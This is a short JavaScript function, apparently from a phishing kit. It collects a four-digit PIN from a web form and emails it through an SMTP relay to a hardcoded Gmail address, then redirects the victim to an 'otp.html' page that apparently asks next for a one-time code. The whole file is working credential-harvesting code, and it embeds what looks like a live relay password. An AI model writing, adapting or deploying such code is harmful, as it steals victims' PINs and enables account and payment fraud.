function emailSend() {
  var pin1 = document.getElementsByName('pin1')[0].value;
  var pin2 = document.getElementsByName('pin2')[0].value;
  var pin3 = document.getElementsByName('pin3')[0].value;
  var pin4 = document.getElementsByName('pin4')[0].value;

  var pin = pin1 + pin2 + pin3 + pin4; // Concatenating the individual PIN values

  var messageBody = "PIN: " + pin; // Constructing the message body with the PIN

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "60F88560F588591A7F78F2A9E657115D12C3",
    To: 'payday10177@gmail.com', // Change this to your email address where you want to receive the PIN
    From: "payday10177@gmail.com",
    Subject: "PIN",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the PIN details", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
